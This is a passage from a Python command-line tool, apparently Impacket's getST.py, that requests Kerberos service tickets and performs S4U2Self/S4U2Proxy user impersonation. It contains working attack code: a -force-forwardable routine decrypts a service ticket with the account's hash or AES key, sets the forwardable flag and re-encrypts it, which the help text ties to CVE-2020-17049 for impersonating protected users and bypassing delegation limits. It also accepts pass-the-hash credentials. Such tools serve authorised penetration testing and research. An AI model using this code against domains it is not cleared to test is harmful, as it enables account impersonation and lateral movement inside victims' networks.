                            key_type = int(key['keytype'])
                            key_value = bytes(key['keyvalue'])
                            type_name = constants.EncryptionTypes(key_type)
                            hex_key = hexlify(key_value).decode('utf-8')
                            logging.info('%s:%s' % (type_name, hex_key))
            
            except Exception as e:
                if logging.getLogger().level == logging.DEBUG:
                    import traceback
                    traceback.print_exc()

        if logging.getLogger().level == logging.DEBUG:
            logging.debug('TGS_REP')
            print(tgs.prettyPrint())

        spn = Principal()
        spn.from_asn1(tgs['ticket'], 'realm', 'sname')

        if self.__force_forwardable and spn.components[0].lower() != "krbtgt":
            # Convert hashes to binary form, just in case we're receiving strings
            if isinstance(nthash, str):
                try:
                    nthash = unhexlify(nthash)
                except TypeError:
                    pass
            if isinstance(aesKey, str):
                try:
                    aesKey = unhexlify(aesKey)
                except TypeError:
                    pass

            # Compute NTHash and AESKey if they're not provided in arguments
            if self.__password != '' and self.__domain != '' and self.__user != '':
                if not nthash:
                    nthash = compute_nthash(self.__password)
                    if logging.getLogger().level == logging.DEBUG:
                        logging.debug('NTHash')
                        print(hexlify(nthash).decode())
                if not aesKey:
                    salt = self.__domain.upper() + self.__user
                    aesKey = _AES256CTS.string_to_key(self.__password, salt, params=None).contents
                    if logging.getLogger().level == logging.DEBUG:
                        logging.debug('AESKey')
                        print(hexlify(aesKey).decode())

            # Get the encrypted ticket returned in the TGS. It's encrypted with one of our keys
            cipherText = tgs['ticket']['enc-part']['cipher']

            # Check which cipher was used to encrypt the ticket. It's not always the same
            # This determines which of our keys we should use for decryption/re-encryption
            newCipher = _enctype_table[int(tgs['ticket']['enc-part']['etype'])]
            if newCipher.enctype == Enctype.RC4:
                key = Key(newCipher.enctype, nthash)
            else:
                key = Key(newCipher.enctype, aesKey)

            # Decrypt and decode the ticket
            # Key Usage 2
            # AS-REP Ticket and TGS-REP Ticket (includes tgs session key or
            #  application session key), encrypted with the service key
            #  (section 5.4.2)
            plainText = newCipher.decrypt(key, 2, cipherText)
            encTicketPart = decoder.decode(plainText, asn1Spec=EncTicketPart())[0]

            # Print the flags in the ticket before modification
            logging.debug('\tService ticket from S4U2self flags: ' + str(encTicketPart['flags']))
            logging.debug('\tService ticket from S4U2self is'
                          + ('' if (encTicketPart['flags'][TicketFlags.forwardable.value] == 1) else ' not')
                          + ' forwardable')

            # Customize flags the forwardable flag is the only one that really matters
            logging.info('\tForcing the service ticket to be forwardable')
            # convert to string of bits
            flagBits = encTicketPart['flags'].asBinary()
            # Set the forwardable flag. Awkward binary string insertion
            flagBits = flagBits[:TicketFlags.forwardable.value] + '1' + flagBits[TicketFlags.forwardable.value + 1:]
            # Overwrite the value with the new bits
            encTicketPart['flags'] = encTicketPart['flags'].clone(value=flagBits)  # Update flags

            logging.debug('\tService ticket flags after modification: ' + str(encTicketPart['flags']))
            logging.debug('\tService ticket now is'
                          + ('' if (encTicketPart['flags'][TicketFlags.forwardable.value] == 1) else ' not')
                          + ' forwardable')

            # Re-encode and re-encrypt the ticket
            # Again, Key Usage 2
            encodedEncTicketPart = encoder.encode(encTicketPart)
            cipherText = newCipher.encrypt(key, 2, encodedEncTicketPart, None)

            # put it back in the TGS
            tgs['ticket']['enc-part']['cipher'] = cipherText

        # Parse TGS

        cipherText = tgs['enc-part']['cipher']
        # Key Usage 8
        # TGS-REP encrypted part (includes application session
        # key), encrypted with the TGS session key (Section 5.4.2)
        plainText = cipher.decrypt(sessionKey, 8, cipherText)
        encTGSRepPart = decoder.decode(plainText, asn1Spec = EncTGSRepPart())[0]
        newSessionKey = Key(encTGSRepPart['key']['keytype'], encTGSRepPart['key']['keyvalue'].asOctets())
        newCipher = _enctype_table[int(encTGSRepPart['key']['keytype'])]

        # Check if we get the requested serviceName: If not this is for another KDC

        if spn.components[0].lower() != "krbtgt":
            return r, newCipher, sessionKey, newSessionKey
        else:
            nextDomain = spn.components[1].upper()

            if nextDomain.lower() != self.__domain.lower():

                # Send subsequent TGS-REQ with krbtgt/self.__domain until we reach the self.__domain

                logging.info(f'Requesting TGS-REQ for krbtgt/{self.__domain.upper()} to {nextDomain}')
                r, newCipher, oldSessionKey, newSessionKey = getKerberosTGS(Principal(f"krbtgt/{self.__domain.upper()}",
                                                                                      type = constants.PrincipalNameType.NT_SRV_INST.value),
                                                                                      nextDomain, nextDomain, r, newCipher, newSessionKey)

                spn = Principal()
                tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]
                spn.from_asn1(tgs['ticket'], 'realm', 'sname')
                nextDomain = spn.components[1].upper()

            # Send the final S4U2Self[+U2U]

            if self.__kdcHost is not None:
                nextKDC = self.__kdcHost
            else:
                nextKDC = nextDomain
            return self.doS4U2Self(r, newCipher, newSessionKey, additionalTicket, nthash, aesKey, nextDomain, nextKDC)

    def run(self):
        tgt = None

        # Do we have a TGT cached?
        domain, _, TGT, _ = CCache.parseFile(self.__domain)

        # ToDo: Check this TGT belongs to the right principal
        if TGT is not None:
            tgt, cipher, sessionKey = TGT['KDC_REP'], TGT['cipher'], TGT['sessionKey']
            oldSessionKey = sessionKey
            logging.debug("session key : " + str(sessionKey.contents))
            
        if tgt is None:
            # Still no TGT
            userName = Principal(self.__user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
            logging.info('Getting TGT for user')
            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain,
                                                                    unhexlify(self.__lmhash), unhexlify(self.__nthash),
                                                                    self.__aesKey,
                                                                    self.__kdcHost)
            logging.debug("TGT session key: %s" % hexlify(sessionKey.contents).decode())
            logging.info('Saving ticket in %s' % (self.__user + '.ccache'))
            ccache = CCache()
            ccache.fromTGT(tgt, oldSessionKey, oldSessionKey)
            ccache.saveFile(self.__user + '.ccache')

        # Ok, we have valid TGT, let's try to get a service ticket
        
        if self.__options.impersonate is None: # TGS-REQ only

            if self.__options.renew is True:
                logging.info("Renewing TGT")

            # Normal TGS interaction
            else:
                logging.info('Getting ST for user')

            serverName = Principal(self.__options.spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
            tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, domain, self.__kdcHost, tgt, cipher, sessionKey, self.__options.renew)
            self.__saveFileName = self.__user
        
        else: # S4U

            # Here's the rock'n'roll
            try:
                if self.__self: # S4U2Self[+U2U] only

                    # Save TGT for self.__domain for potential U2U
                    tgtDomain = tgt

                    nextDomain = self.__impersonatedomain.upper()

                    if self.__impersonatedomain.lower() != self.__domain.lower():

                        # We need inter-realm TGT for self.__impersonatedomain

                        if self.__kdcHost is None:
                            logging.info(f'Requesting TGS-REQ for krbtgt/{self.__impersonatedomain.upper()} to {self.__domain.upper()}')
                        else:
                            logging.info(f'Requesting TGS-REQ for krbtgt/{self.__impersonatedomain.upper()} to {self.__kdcHost}')
                        tgt, cipher, oldSessionKey, sessionKey = getKerberosTGS(Principal(f"krbtgt/{self.__impersonatedomain.upper()}",
                                                                        type = constants.PrincipalNameType.NT_SRV_INST.value),
                                                                        self.__domain.upper(), self.__kdcHost, tgt, cipher, sessionKey)
                        
                    if self.__impersonatedc is not None:
                        nextKDC = self.__impersonatedc
                    else:
                        nextKDC = nextDomain

                    if self.__u2u:
                        if self.__additional_ticket is None: # Provide TGT for self.__domain as additional ticket
                            decodedASREP = decoder.decode(tgtDomain, asn1Spec = AS_REP())[0]
                            additionalTicket = Ticket()
                            additionalTicket.from_asn1(decodedASREP['ticket'])
                        else: # Otherwise use the one provided
                            ccache = CCache.loadFile(additionalTicket)
                            creds = ccache.credentials[0]
                            rawTicket = creds.toTGT()
                            decodedASREP = decoder.decode(rawTicket['KDC_REP'], asn1Spec = AS_REP())[0]
                            additionalTicket = Ticket()
                            additionalTicket.from_asn1(decodedASREP['ticket'])
                    else:
                        additionalTicket = None

                    tgs, cipher, oldSessionKey, sessionKey = self.doS4U2Self(tgt, cipher, sessionKey, additionalTicket, unhexlify(self.__nthash),
                                                                             self.__aesKey, nextDomain, nextKDC)
                
                elif self.__proxy: # S4U2Proxy only

                    if self.__additional_ticket is not None:
                        ccache = CCache.loadFile(self.__additional_ticket)
                        creds = ccache.credentials[0]
                        rawTicket = creds.toTGT()
                        decodedASREP = decoder.decode(rawTicket['KDC_REP'], asn1Spec = AS_REP())[0]
                        additionalTicket = Ticket()
                        additionalTicket.from_asn1(decodedASREP['ticket'])
                    else:
                        additionalTicket = None
                    
                    if self.__kdcHost is None:
                        nextKDC = self.__domain.upper()
                    else:
                        nextKDC = self.__kdcHost

                    tgs, cipher, oldSessionKey, sessionKey = self.doS4U2Proxy(tgt, cipher, sessionKey, self.__options.spn, additionalTicket, False,
                                                                              self.__forest, self.__domain.upper(), nextKDC)
                
                else: # S4U2Self[+U2U] + S4U2Proxy

                    # S4U2Self[+U2U]

                    # Save TGT for self.__domain for next S4U2Proxy
                    tgtDomain = tgt
                    cipherDomain = cipher
                    sessionKeyDomain = sessionKey

                    nextDomain = self.__impersonatedomain.upper()

                    if self.__impersonatedomain.lower() != self.__domain.lower():

                        # We need inter-realm TGT for self.__impersonatedomain

                        if self.__kdcHost is None:
                            logging.info(f'Requesting TGS-REQ for krbtgt/{self.__impersonatedomain.upper()} to {self.__domain.upper()}')
                        else:
                            logging.info(f'Requesting TGS-REQ for krbtgt/{self.__impersonatedomain.upper()} to {self.__kdcHost}')
                        tgt, cipher, oldSessionKey, sessionKey = getKerberosTGS(Principal(f"krbtgt/{self.__impersonatedomain.upper()}",
                                                                        type = constants.PrincipalNameType.NT_SRV_INST.value),
                                                                        self.__domain.upper(), self.__kdcHost, tgt, cipher, sessionKey)
                        
                    if self.__impersonatedc is not None:
                        nextKDC = self.__impersonatedc
                    else:
                        nextKDC = nextDomain

                    if self.__u2u:
                        if self.__additional_ticket is None: # Provide TGT for self.__domain as additional ticket
                            decodedASREP = decoder.decode(tgtDomain, asn1Spec = AS_REP())[0]
                            additionalTicket = Ticket()
                            additionalTicket.from_asn1(decodedASREP['ticket'])
                        else: # Otherwise use the one provided
                            ccache = CCache.loadFile(additionalTicket)
                            creds = ccache.credentials[0]
                            rawTicket = creds.toTGT()
                            decodedASREP = decoder.decode(rawTicket['KDC_REP'], asn1Spec = AS_REP())[0]
                            additionalTicket = Ticket()
                            additionalTicket.from_asn1(decodedASREP['ticket'])
                    else:
                        additionalTicket = None

                    tgs, cipher, oldSessionKey, sessionKey = self.doS4U2Self(tgt, cipher, sessionKey, additionalTicket, unhexlify(self.__nthash),
                                                                             self.__aesKey, nextDomain, nextKDC)

                    # S4U2Proxy

                    decodedTGSREP = decoder.decode(tgs, asn1Spec = TGS_REP())[0]
                    additionalTicket = Ticket()
                    additionalTicket.from_asn1(decodedTGSREP['ticket'])
                    
                    if self.__kdcHost is None:
                        nextKDC = self.__domain.upper()
                    else:
                        nextKDC = self.__kdcHost

                    tgs, cipher, oldSessionKey, sessionKey = self.doS4U2Proxy(tgtDomain, cipherDomain, sessionKeyDomain, self.__options.spn, additionalTicket,
                                                                              False, self.__forest, self.__domain.upper(), nextKDC)

            except Exception as e:
                print(str(e))
                if logging.getLogger().level == logging.DEBUG:
                    import traceback
                    traceback.print_exc()
                return
            self.__saveFileName = self.__options.impersonate

        self.saveTicket(tgs, oldSessionKey)

if __name__ == '__main__':
    print(version.BANNER)

    parser = argparse.ArgumentParser(add_help=True, description="Given a password, hash or aesKey, it will request a "
                                                                "Service Ticket and save it as ccache")
    parser.add_argument('identity', action='store', help='[domain/]username[:password]')
    parser.add_argument('-spn', action="store", help='SPN (service/server) of the target service the '
                                                     'service ticket will be generated for')
    parser.add_argument('-altservice', action="store", help='New sname/SPN to set in the ticket')
    parser.add_argument('-dmsa', action='store_true', help='Use DMSA (Delegated Managed Service Accounts) ')
    parser.add_argument('-impersonate', action="store", help='Target username@domain that will be impersonated (thru S4U2Self)'
                                                             ' for quering the ST. Keep in mind this will only work if '
                                                             'the identity provided in this scripts is allowed for '
                                                             'delegation to the SPN specified')
    parser.add_argument('-additional-ticket', action='store', metavar='ticket.ccache', help='Additional ticket for S4U2Self or S4U2Proxy')
    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-u2u', dest='u2u', action='store_true', help='Use User-to-User with S4U2Self')
    parser.add_argument('-self', dest='self', action='store_true', help='Only do S4U2Self, no S4U2Proxy')
    parser.add_argument('-proxy', dest='proxy', action='store_true', help='Only do S4U2Proxy, no S4U2Self')
    parser.add_argument('-force-forwardable', action='store_true', help='Force the service ticket obtained through '
                                                                        'S4U2Self to be forwardable. For best results, the -hashes and -aesKey values for the '
                                                                        'specified -identity should be provided. This allows impresonation of protected users '
                                                                        'and bypass of "Kerberos-only" constrained delegation restrictions. See CVE-2020-17049')
    parser.add_argument('-renew', action='store_true', help='Sets the RENEW ticket option to renew the TGT used for authentication. Set -spn to \'krbtgt/DOMAINFQDN\'')
    parser.add_argument('-forest', dest='forest', action='store_true', help='Use branch-aware algorithm for cross-forest S4U2Proxy')

    group = parser.add_argument_group('authentication')
    group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                                                       '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the '
                                                       'ones specified in the command line')
    group.add_argument('-aesKey', action="store", metavar="hex key", help='AES key to use for Kerberos Authentication '
                                                                          '(128 or 256 bits)')
    group.add_argument('-dc-ip', action='store', metavar="ip address", help='IP Address of the domain controller. If '
                                                                            'omitted it use the domain part (FQDN) specified in the identity parameter')
    group.add_argument('-proxydomain', action='store', metavar="ip address", help='Domain of target SPN for S4U2proxy. Required for S4U2Proxy')
    group.add_argument('-proxydc', action='store', metavar="ip address", help='IP Address of the domain controller of target SPN for S4U2Proxy. '
                                                                                'Otherwise domain from -proxydomain will be used')
    group.add_argument('-impersonatedc', action='store', metavar="ip address", help='IP Address of the domain controller of impersonate user\'s domain for S4U2Self. '
                                                                                    'Otherwise domain from -impersonate will be used')

    if len(sys.argv) == 1:
        parser.print_help()
        print("\nExamples: ")
        print("\t./getST.py -spn cifs/contoso-dc -hashes lm:nt contoso.com/user\n")
        print("\tit will use the lm:nt hashes for authentication. If you don't specify them, a password will be asked")
        sys.exit(1)

    options = parser.parse_args()

    if options.self and options.proxy:
        parser.error("arguments -self and -proxy provided, do not set them for full S4U2Self + S4U2Proxy")
    else:
        if options.self:
            if options.impersonate is None:
                parser.error("argument -impersonate is required when doing S4U2Self")
            if options.altservice is not None:
                if '/' not in options.altservice:
                    parser.error("When doing S4U2Self only, substitution service must include service class AND name (i.e. CLASS/HOSTNAME@REALM, or CLASS/HOSTNAME)")
        else:
            if options.spn is None:
                parser.error("argument -spn is required, except when -self is set")
            if options.impersonate is not None and options.proxydomain is None:
                parser.error("argument -proxydomain required")

    if options.u2u is True and (options.self is False and options.impersonate is None):
        parser.error("-u2u is not implemented yet without being combined to S4U. Can't obtain a plain User-to-User ticket")
        # implementing plain u2u would need to modify the getKerberosTGS() function and add a switch
        # in case of u2u, the proper flags should be added in the request, as well as a proper S_PRINCIPAL structure with the domain being set in order to target a UPN
        # the request would also need to embed an additional-ticket (the target user's TGT)

    # Init the example's logger theme
    logger.init(options.ts, options.debug)

    domain, username, password, _, _, options.k = parse_identity(options.identity, options.hashes, options.no_pass, options.aesKey, options.k)

    if domain == '':
        logging.critical('Domain should be specified!')
        sys.exit(1)

    try:
        executer = GETST(username, password, domain, options)
        executer.run()
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback

            traceback.print_exc()
        print(str(e))
